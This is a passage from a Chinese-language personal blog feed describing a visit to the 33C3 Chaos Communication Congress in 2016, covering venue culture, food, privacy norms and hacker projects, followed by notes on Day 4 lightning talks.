&lt;li&gt;Day 3: &lt;a href="https://media.ccc.de/v/33c3-8088-lightning_talks_day_3"&gt;https://media.ccc.de/v/33c3-8088-lightning_talks_day_3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Day 4: &lt;a href="https://media.ccc.de/v/33c3-8089-lightning_talks_day_4"&gt;https://media.ccc.de/v/33c3-8089-lightning_talks_day_4&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各式各樣數不清的社群攤位(他們將每個社群稱之為 Assembly)  &lt;ul&gt;
&lt;li&gt;每個社群可以有自己的議程，公告的話可以自己在會場的柱子或是公告版張貼。  &lt;/li&gt;
&lt;li&gt;焊接、Arduino、LED、3D 列印、雷射雕刻、虛擬實境、BitCoin、BlockChain、Ruby、Python、互動式裝置、CTF、棋藝、開鎖等等等，不勝枚舉。  &lt;ul&gt;
&lt;li&gt;連入口的柱子都是 LED，讓我想到母校台中一中的新校門。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 pillar" src="/files/33c3/33c3-pillar.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大多數的人就是在昏暗的環境中拿著一台筆電不停的在敲鍵盤或者是和人開心的交談  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會期 4 天中，完全不關閉的會場。  &lt;ul&gt;
&lt;li&gt;入口都有工作人員看守著，只有佩帶手環的人才能進入。  &lt;/li&gt;
&lt;li&gt;手環是在報到的時候發的，就是個印有 33C3 字樣的一條帶子加一個鐵環，入場時會有人要你將手環用上面的鐵環束緊到手環無法脫下的狀態，然後用機器壓緊鐵環，使你無法打開，所以這幾天內手環都不能拿下來，等同於你沒辦法把票給不同的人。  &lt;ul&gt;
&lt;li&gt;但其實可以偷偷把手環拆鬆一點就可以拿下來洗澡哩，隔天進會場前再記得戴上就好。  &lt;/li&gt;
&lt;li&gt;沒有任何科技，簡單而原始的作法，杜絕有買票的人把掛在脖子上的 Badge 拿下來給沒買票的人戴就可以進場的問題。  &lt;/li&gt;
&lt;li&gt;戴手環比掛狗牌好看多了  &lt;/li&gt;
&lt;li&gt;不需要曝露自己的名字或暱稱在狗牌身上，想知道這個人是誰的話，就只能用最原始的方式，交談。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="33C3 wristband" src="/files/33c3/wristband.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會場內有吊床、有沙發、有軟墊，所以有些人乾脆累了就直接睡在會場內，甚至有些人就直接睡在地上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所有生物都可入場  &lt;ul&gt;
&lt;li&gt;&lt;img alt="All Creatures Welcome" src="/files/33c3/all-creatures-welcome.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;無論是外星人、人類、貓、狗，所以有些人有帶狗進來，但好像就沒看到有人帶貓了，沒記錯的話帶寵物應該是不用買票就是。  &lt;/li&gt;
&lt;li&gt;到處都可以席地而坐，只要你沒有妨礙到其他人的話，基本上沒有人會管你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;人手一瓶的軟性飲料：CLUB-MATE  &lt;ul&gt;
&lt;li&gt;用瑪黛(Mate)茶調成的氣泡飲料，有著難以言喻的獨特風味，同行的友人們一致同意最接近的味道大概是：「帶有氣泡的淡烏梅汁」  &lt;/li&gt;
&lt;li&gt;會期這幾天我也是每天至少一瓶，但沒有在會場裏面買就是，因為裏面賣的實在是太貴了，會場裏面一瓶賣 2.5 歐，但我到超市去買，特價只要 0.99 歐，就算加上漢堡的退瓶費 0.15 歐，也還便宜一半啊！  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Club-Mate" src="/files/33c3/club-mate.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;德國人真的非常喜歡喝氣泡飲料，連喝水都要喝氣泡水，估計應該是因為喝有氣泡的啤酒喝習慣了，覺得喝飲料就是要有氣泡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各個年齡層的參與者，從嬰兒、兒童、青少年、成人到老人  &lt;ul&gt;
&lt;li&gt;此時歐洲正值聖誕過年期間，來參加的許多人都有小孩子，所以這裡也提供很多給孩童的設施，沒記錯的話還允許購買兒童票，所以聽議程的過程中突然聽到有嬰兒嚎啕大哭別太驚訝，其父母會趕快把嬰兒抱出會議廳，大部分的人也沒有什麼特殊反應。  &lt;ul&gt;
&lt;li&gt;連紀念 T-shirt 都有專門做給小孩子的 size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;許多父母甚至就把嬰兒放在會場的地毯上爬，這如果在台灣的話應該會被投以異樣的眼光吧，例如：「怎麼放嬰兒在這麼髒的地上爬？」之類的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;四個會議廳、四軌議程、每天從早上十一點到凌晨十二點，除了最後一天只到晚上 6 點就閉幕。  &lt;ul&gt;
&lt;li&gt;其中 3 個會議廳的大小都跟中研院的 R0 差不多大甚至更大，剩下的那個會議廳的大小比中研院的交誼廳再大一些。  &lt;/li&gt;
&lt;li&gt;每個議程的時間大都為 30 ~ 60 分鐘不等，為 Q&amp;amp;A 和一些突發狀況做彈性時間的預留  &lt;/li&gt;
&lt;li&gt;每一個會議廳都會在非議程時間顯示接下來的議程及其時間，以及其他會議廳的議程。會場外的電視也會播放所有會議廳接下來的議程、節錄出來的 twee t以及一些社群或是專案的推廣廣告。  &lt;/li&gt;
&lt;li&gt;每個會議廳只要滿了，為了維護議程的品質與空間，工作人員會開始在入口禁止會眾繼續進入，也不准席地而坐，當然也不准佔位的行為，有時候允許站著，但有時候也會請站著的人離開，因為基本上都有直播可以看，沒佔到位置的人就請看直播吧。  &lt;/li&gt;
&lt;li&gt;佔位的行為非常少，熱門的議程整個會議廳都坐滿沒有背包佔位的情況非常常見。而且我遇到有先幫朋友佔位的人，到議程開始的時候朋友都有出現。不知道是不是因為沒有桌子的關係，所以也不會有人把筆電就直接放在桌上佔位。反觀台灣的 Conference，許多人都會有事先佔位的情形，而且甚至議程開始了也根本沒回到位置上，就這樣佔了個位置過了一整個議程。  &lt;/li&gt;
&lt;li&gt;基本上很少議程是完全沒有人問問題的，而且大多數人問的問題都非常精闢或非常深入，就算沒有，也很少聽到有人問一些不相關的問題。  &lt;ul&gt;
&lt;li&gt;我覺得這也算是我要努力的方向，我自認自己無法當下想出這樣的問題，而且就算想出了，我也不確定自己有沒有自信在當下發問。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;發問用的麥克風只有設定在幾個區域，所以想要發問的人必須走到麥克風附近站著等候主持人提示後發問。  &lt;ul&gt;
&lt;li&gt;不像台灣的 Conf 可能在座位上就配有麥克風，或者是會有工作人員把麥克風遞給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無性別廁所（UNISEX WC)，廁所不分男女。  &lt;ul&gt;
&lt;li&gt;會眾的男女比挺平均的，很多女生也是筆電上貼著各式各樣的貼紙，然後就專注的盯著筆電的螢幕在敲鍵盤，不像台灣大多數的 Conference 都還是男生居多。我想這是個可以努力的方向，但可能跟整個國家的教育方式還有社會期望也有關係就是。  &lt;/li&gt;
&lt;li&gt;幾乎所有的廁所原本在門上的男女圖示都被貼 UNISEX WC 的紙貼掉，成為無性別廁所，無論性別，一律共用。  &lt;/li&gt;
&lt;li&gt;雖然是這樣，但我稍微觀察了一下，大多數的本地人都還是會照原本的性別進去，女生左邊、男生右邊，可能是因為習慣了吧。  &lt;/li&gt;
&lt;li&gt;但基本上如果有生理女性進去原本的男廁或生理男性進去原本的女廁也不會有任何問題。  &lt;/li&gt;
&lt;li&gt;我就有進去原本的女廁，也體驗到排隊等待的時間真的很長，兩間同樣都只有 4 個隔間式的廁所，但男廁還有 6 個小便斗，也因為要有小便斗的關係，男廁空間是比女廁空間還大的，但隔間式廁所的使用率反而沒有女廁高。  &lt;/li&gt;
&lt;li&gt;使用原本的男廁時也有女生走進來使用廁所，也沒什麼事情發生。  &lt;/li&gt;
&lt;li&gt;倒是我最不習慣的一點是歐洲的小便斗之間都不會有隔版，而且小便斗頂部也不會有個平台，所以你站的再近基本上都還是會被看到就是，所以就別在意了，貼更近只會讓自己的褲子溼了。  &lt;/li&gt;
&lt;li&gt;後來在 Closing Ceremony 的時候有秀一張照片是，有人把 UNISEX 貼掉改成 CyberSex，結果大家都笑了，真的是有夠宅（稱讚意味） XDDD  &lt;ul&gt;
&lt;li&gt;我有看到被貼成 CyberSex 的牌子，但忘記拍下來了 Orz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最多人用的筆電是 IBM 的 ThinkPad （小黑），不是 MacBook。  &lt;ul&gt;
&lt;li&gt;身為一個標準的 Hacker，當然是不需要滑鼠也不需要觸控版，只需要能讓手保持在打字區維持最高效率的小紅點。  &lt;/li&gt;
&lt;li&gt;然後運行的作業系統大多數都是 Linux，至於是什麼 Distro 就因人而異，有看到有人灌 Mint，也有看到有人灌 Debian。  &lt;/li&gt;
&lt;li&gt;當然還是有看到人用 Windows 和 OS X 就是，只是極少。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非常重視隱私，拍照的時候最好裏面不要有人，如果有人入鏡的話必須先徵得所有入鏡的人的同意。  &lt;ul&gt;
&lt;li&gt;會場很多地方都有「拍照之前請先徵得所有入鏡的人的同意」的標語  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Ask before taking photo" src="/files/33c3/ask-before-taking-photo.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;同行的友人拿出相機在拍照的時候，工作人員還特地過來講說不要隨便對著人拍照，最好只拍沒有人入鏡的照片，因為去年貌似有人因為這個而鬧出問題的樣子。  &lt;/li&gt;
&lt;li&gt;沒有攝影組拍照，攝影組負責的應該就是議程的錄影錄音而已。  &lt;ul&gt;
&lt;li&gt;不像台灣的 Conf，常常會眾都要被一堆閃光燈閃。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;幾乎所有東西都是要錢的。  &lt;ul&gt;
&lt;li&gt;食物都是要錢的，應該是請合作的攤販進來擺攤，有 Coffee Bike、可麗餅、漢堡、泰式咖哩、披薩、熱狗堡，各式各樣，但價格偏貴，而且食物內幾乎是沒有蔬菜的。  &lt;ul&gt;
&lt;li&gt;這個漢堡要 6.5 歐，現場煎的牛排真的很香很誘人，不過我只吃一次就是。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 burger" src="/files/33c3/33c3-burger.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個熱狗堡要 5 歐（還沒加料，料在旁邊可以自己加）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 hot dog" src="/files/33c3/33c3-hot-dog.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不像台灣的 Conference，會眾大多已經習慣有免費或包含在票價裡的上午茶點、便當、下午茶點。  &lt;/li&gt;
&lt;li&gt;基本上我覺得這點跟歐洲的價值觀是相符合的，台灣就是有太多的免費，其實背後隱藏的都是不合理的過勞或是沒有得到相對應價值的被壓榨。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基本上每個會議廳外都有販售飲料的吧台，飲料的售價也比超市硬是貴上快一倍，但畢竟他們幫你把飲料直接運來會場賣，只能說不爽不要買。  &lt;ul&gt;
&lt;li&gt;用台灣的收入來歐洲消費真的有點吃不消，很多東西都覺得貴，所以我的作法就是去超市買 CLUB-MATE 再帶進去會場喝，後來連午餐晚餐都是這樣做。  &lt;ul&gt;
&lt;li&gt;這種時候就會好想換個 remote job 領美金或歐元的薪水但花台幣度日子啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒有攤位會免費贈送你贈品，例如我去參加的 Lock Picking Workshop，想要有一組開鎖工具拿來練習的話，就請去旁邊購買一組，最低要價 15 歐。免費的贈品最多就是貼紙吧，還有一個攤位好像是可以拿他發出去的 QR code 去攤位找機器掃 QR code，然後機器會推出一條德國香腸給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒什麼東亞人和黑人的面孔  &lt;ul&gt;
&lt;li&gt;大概就我和同行的友人共 4 個人，還有第二天晚上一個中國人在講解無線電構成的網路，還有看到一個用著轉接頭充筆電的女生，再加上其他有看到的，全部加起來可能不到 20 個吧。  &lt;/li&gt;
&lt;li&gt;基本上對外國人不會有什麼特別的反應，所以敢主動與他們交談才是重點，但我自己這方面極度欠缺自信就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各種特別的東西  &lt;ul&gt;
&lt;li&gt;Lounge Area  &lt;ul&gt;
&lt;li&gt;一個超大的像夜店的區域，裏面可以吸煙，昏暗的燈光加上閃爍的光線，再搭配著震耳欲聾的電音，就是個搖頭的地方。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Lounge Area" src="/files/33c3/lounge-area.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EventPhone  &lt;ul&gt;
&lt;li&gt;&lt;img alt="eventphone" src="/files/33c3/eventphone.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;每個人可以申請，會得到一組四位數字的代號，都擁有 EventPhone 的人可以直接用代號打電話給對方，也可以免費打國際電話。  &lt;/li&gt;
&lt;li&gt;需要支援 GSM 的 SIM 卡（會場內有人兜售，價格是 5 歐，不過不知道安全性如何就是,因為我不確定是不是工作人員在賣，感覺不是。）  &lt;/li&gt;
&lt;li&gt;或是支援 DECT 的無線電話也可。  &lt;/li&gt;
&lt;li&gt;這個似乎有段故事，聽說今年原本 EventPhone 會有問題，結果 CCC 裏面有人直接跟德國的電信商談，然後就搞定了這件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;氣動膠囊網路（Seidenstraße）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Seidenstraße-1" src="/files/33c3/Seidenstraße-1.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Seidenstraße-2" src="/files/33c3/Seidenstraße-2.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;Seidenstraße 的意思是絲路，對，就是那個絲路。但在這裡翻譯成氣動膠囊網路，因為它是透過空氣當作動力來傳輸的。  &lt;ul&gt;
&lt;li&gt;聽說產生空氣動力來源的裝置是吸塵器 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實體膠囊（被稱做 bubble，其實就是一個塑膠球），通過驗證之後，再輸入想把膠囊送到會場內哪個地方的代號之後，膠囊就會被發射出去並送該處，發射的時候因為塑膠管不是平滑的，所以會有一個很酷的、持續的「唰」的聲音。  &lt;/li&gt;
&lt;li&gt;這是 30C3 時的相關介紹 &lt;a href="https://events.ccc.de/2013/12/08/seidenstrasse/"&gt;Seidenstrasse – a pneumatic tube system for 30C3 «  CCC Event Weblog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有一塊區域專門在做現場訪談  &lt;ul&gt;
&lt;li&gt;但都是講德文，所以我聽不懂就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speaker Sofa  &lt;ul&gt;
&lt;li&gt;這邊似乎是讓講者待在這邊，給講者之間或和會眾交流用，有時也有一些類似訪談的活動，有些人會坐在這聆聽，因為也是德文，所以我聽不懂。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會場內可以騎滑板車、電動滑板車、溜滑板，只要你敢而且不會撞到人的話，不會有人阻止你。  &lt;/li&gt;
&lt;li&gt;有人用滑雪板加彈簧還有 sensor 自己 hack 一個遊戲出來，玩家可以站在有彈簧的滑雪版上移動來讓滑雪中的 Tux 改變行進方向，Tux 吃到愈多魚則得分愈高。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Snowboard Hacker" src="/files/33c3/snowboard-hacker.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有人寫了一個計算沙堆與 sensor 之間的距離然後根據這個距離來幫不同高度的區域上色，然後利用投影機和鏡子把顏色投影在沙子上面，做出類似實體等高線圖的效果。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Sand" src="/files/33c3/sand.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Macbook 上接了一個手持式的會發光的槍型裝置，可以幫你的全身外觀建模，讓後讓 3D 印表機列印出你的模型。  &lt;/li&gt;
&lt;li&gt;有人用電燈開關、挖了幾個空格的大木板，再加上自己焊的電路還有寫的程式，做出了可以兩個人互相比誰分數多的打地鼠遊戲。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Redemption Game" src="/files/33c3/redemption-game.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有 Food Hacker 現場在做分子料理  &lt;/li&gt;
&lt;li&gt;官方舉辦的大地遊戲：There is No Game  &lt;ul&gt;
&lt;li&gt;到大地遊戲的櫃台，有一部電腦，輸入自己的名字並從九種特質中選擇一種，接著會列印出一張名牌。  &lt;/li&gt;
&lt;li&gt;集滿九種不同特質的 9 個人後，到櫃台領取提示即可開始解謎。  &lt;/li&gt;
&lt;li&gt;會場中到處有柱狀的機器，需要插入鑰匙或按下密碼。  &lt;/li&gt;
&lt;li&gt;很像實體的 Wargame，據說還需要和其他隊伍合作才有辦法解完，但我們這部份沒有玩完，所以無法詳細描述。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;感想&lt;/h2&gt;
&lt;p&gt;真的是個很棒的 Conference，&lt;br /&gt;
各種方面都非常的 geek、非常的自在，&lt;br /&gt;
難怪 Opening Ceremony 的講者會有 post-conference depression。&lt;br /&gt;
能辦到第 33 屆真的很不簡單啊，&lt;br /&gt;
而且會期一直都是在歐洲的過年期間，&lt;br /&gt;
試想如果在臺灣的春節時間辦個 Conference，&lt;br /&gt;
有多少人會願意或有空參加？  &lt;/p&gt;
&lt;p&gt;有個感受到比較明顯差異的地方是，&lt;br /&gt;
德國這邊的 Civil Hacker 幾乎都是抱持著不信任政府的心態，&lt;br /&gt;
所以會期的四天並沒有看到任何政府官員來致詞，&lt;br /&gt;
而台灣的 g0v 算是站在幫助政府的角度，&lt;br /&gt;
這點是比較不一樣的，&lt;br /&gt;
我也不好評斷孰優孰劣。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;原本同行的朋友們是打算投稿 SITCON 2017 分享的，&lt;br /&gt;
但前幾天投稿結果出爐，&lt;br /&gt;
應該是因為跟主題不符合被刷掉了。&lt;br /&gt;
再加上其中一位同行的朋友在 OCF 工作，&lt;br /&gt;
OCF 希望他可以辦一場分享會講講 33C3 的事，&lt;br /&gt;
所以和我一同參加 33C3 的 3 位朋友要舉辦一個小小的分享會，&lt;br /&gt;
有興趣的人歡迎參加。  &lt;/p&gt;
&lt;p&gt;時間是 2017/02/04（六） 19:30~22:00&lt;br /&gt;
地點在 台北摩茲工寮（台北市中正區八德路一段 94 號 3F）&lt;br /&gt;
KKTIX 的報名頁面： &lt;a href="http://pellaeon-a9aa66.kktix.cc/events/33c3-sharing"&gt;http://pellaeon-a9aa66.kktix.cc/events/33c3-sharing&lt;/a&gt;&lt;br /&gt;
共筆頁面：&lt;a href="https://hackmd.io/EYMwpsDMAmCMwFpwCYDGCAsBOArAdgSwA4QQFYAGPEZLC6aPHWIA?both"&gt;https://hackmd.io/EYMwpsDMAmCMwFpwCYDGCAsBOArAdgSwA4QQFYAGPEZLC6aPHWIA?both&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;雖然我現在看好像已經額滿了，&lt;br /&gt;
不過當天應該會開個直播分享給沒辦法到現場的人。&lt;br /&gt;
至於直播連結的話應該就是會在一些社群網站上分享吧，&lt;br /&gt;
有興趣的人再注意一下。  &lt;/p&gt;
&lt;p&gt;我沒有參加的原因是因為星期六我人還沒回台北，&lt;br /&gt;
所以不會出現在現場，&lt;br /&gt;
但應該會鍵盤線上參與。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;33C3 全部演講的錄影，閒閒沒事可以拿來當工作 BGM，順便練英文聽力，有各種不同的腔調。  &lt;ul&gt;
&lt;li&gt;官方網站：&lt;a href="https://media.ccc.de/b/congress/2016"&gt;https://media.ccc.de/b/congress/2016&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Youtube：&lt;a href="https://www.youtube.com/playlist?list=PL_IxoDz1Nq2YqIhABZBqWZKxkL82HCQ5I"&gt;https://www.youtube.com/playlist?list=PL_IxoDz1Nq2YqIhABZBqWZKxkL82HCQ5I&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 04 Feb 2017 20:47:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-30:posts/2016/12/30/33c3-5/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>33c3 (4)</title><link>https://blog.m157q.tw/posts/2016/12/30/33c3-4/</link><description>&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/29/33c3-3"&gt;33C3 (3)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 4 (2016.12.30 Fri)&lt;/h2&gt;
&lt;h3&gt;&lt;a href="https://media.ccc.de/v/33c3-8089-lightning_talks_day_4"&gt;Day 4 Lightning talks&lt;/a&gt;&lt;/h3&gt;
&lt;h4&gt;WhatsApp Backdoor(/Bug?)&lt;/h4&gt;
&lt;p&gt;WhatsApp 在做 End-to-End encryption 的時候似乎是可以被 MITM 的  &lt;/p&gt;
&lt;p&gt;Report on April 10&lt;br /&gt;
Facebook said it's expected behavior&lt;br /&gt;
講者回應說這部應該是 expected behavior&lt;br /&gt;
直到兩天前仍然未修復  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;LibrePCB&lt;/h4&gt;
&lt;p&gt;提供一整套開發 PCB 的工具，&lt;br /&gt;
應該可以算是 PCB 的 IDE，&lt;br /&gt;
也把版本控制包含進去了。  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/LibrePCB/LibrePCB"&gt;https://github.com/LibrePCB/LibrePCB&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Rust in 5 minutes&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;More control and more safety.  &lt;/li&gt;
&lt;li&gt;System progrogrmming language.  &lt;/li&gt;
&lt;li&gt;Compiled language, optimization with LLVM, zero cost abstraction.  &lt;/li&gt;
&lt;li&gt;No null pointers, no dangling pointers, no data races.  &lt;/li&gt;
&lt;li&gt;Developed openly with RFCs.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Tindering Islam&lt;/h4&gt;
&lt;p&gt;把可蘭經的內容拿來像 Tinder 一樣讓使用者評價喜不喜歡這段經文，&lt;br /&gt;
還可以試著修改經文的內容讓其他使用者來評價你修改過的內容，&lt;br /&gt;
產生一個新版的可蘭經。  &lt;/p&gt;
&lt;p&gt;這個 talk 不少人拍手叫好 XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Orwell's law&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Current situation in Czech Republic  &lt;ul&gt;
&lt;li&gt;Censorship law passed  &lt;/li&gt;
&lt;li&gt;LEAD need court order to spy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要就是在講要爭取不被政府監視的權利  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;NC393-CS camera&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Hackable and Open Source Camera  &lt;ul&gt;
&lt;li&gt;Under GPL.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Jailbreaking Governmental Data: PDF becomes RDF&lt;/h4&gt;
&lt;p&gt;巴伐利亞政府喜歡把文件都存成 PDF，&lt;br /&gt;
但 PDF 其實很不開放，&lt;br /&gt;
所以講者把它們的 PDF 都轉成 RDF plus a simple HTML view。  &lt;/p&gt;
&lt;p&gt;寫了個程式做這件事，&lt;br /&gt;
先把 PDF 轉成 XML 再轉成 TTL 最後才轉成 RDF，&lt;br /&gt;
RDF 比較輕量，而且可以做 diff。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Meetings are broken in many many ways&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Some problems  &lt;ul&gt;
&lt;li&gt;Transparency  &lt;ul&gt;
&lt;li&gt;No agenda or not know by participants  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Relevancy  &lt;ul&gt;
&lt;li&gt;Topics not relevant to all participants  &lt;/li&gt;
&lt;li&gt;I have to be the meeting but I don't know why.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Workload  &lt;ul&gt;
&lt;li&gt;Preparation is done by a single person  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Solution?  &lt;ul&gt;
&lt;li&gt;Let participants take part in the preparation  &lt;/li&gt;
&lt;li&gt;Make the metting transparent, relevant and distribute the workload.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者提出了一個 web app 叫作 &lt;a href="https://meetling.org"&gt;Meetling&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Collaboratively draft an agenda, let participants propose and edit agenda items.  &lt;/li&gt;
&lt;li&gt;Share meetings by link (no registration required)  &lt;/li&gt;
&lt;li&gt;Simple to use  &lt;/li&gt;
&lt;li&gt;Stack: Python, Tornado, Redit, JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://github.com/noyainrain/meetling"&gt;https://github.com/noyainrain/meetling&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;YaraRules Project&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;WTF is yara?  &lt;ul&gt;
&lt;li&gt;YARA is a tool aimed at helping malware researchers to identify and classify malware samples.  &lt;/li&gt;
&lt;li&gt;With YARA you can create descriptions of &lt;whatever&gt; based on textual or binary patterns.  &lt;/li&gt;
&lt;li&gt;Each rule consists of a set of strings and a boolean expression which determin the result.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yararules Analyzer  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://analysis.yararules.com"&gt;https://analysis.yararules.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Yara-Rules/rules"&gt;https://github.com/Yara-Rules/rules&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;The neveragain.tech pledge&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://neveragein.tech"&gt;https://neveragein.tech&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;CyberGreen 3.0&lt;/h4&gt;
&lt;p&gt;找人一起參與這個計劃，&lt;br /&gt;
提供資料來一起更好得防禦 DDoS。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;The Ultimate Game Boy Talk&lt;/h3&gt;
&lt;p&gt;這場真的講的超級棒！&lt;br /&gt;
而且超級好奇他的投影片是用哪個軟體製作的，&lt;br /&gt;
真的講的很清楚，&lt;br /&gt;
簡直就是在用 Gameboy 教計算機組織，&lt;br /&gt;
也許當年修計組的時候可以早點遇到類似這樣的教材的話，&lt;br /&gt;
可能就不會覺得很無趣了吧。&lt;br /&gt;
總之，&lt;br /&gt;
這場應該是我在 33C3 裡頭最喜歡的一場演講，&lt;br /&gt;
非常推薦花一個小時觀看一下影片，&lt;br /&gt;
我在聽這場 talk 之前從來不知道一個小小的 GameBoy 裏面藏了這麼多的學問。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;講者資訊  &lt;ul&gt;
&lt;li&gt;Michael Steil  &lt;/li&gt;
&lt;li&gt;@pagetable  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pagetable.com"&gt;http://www.pagetable.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
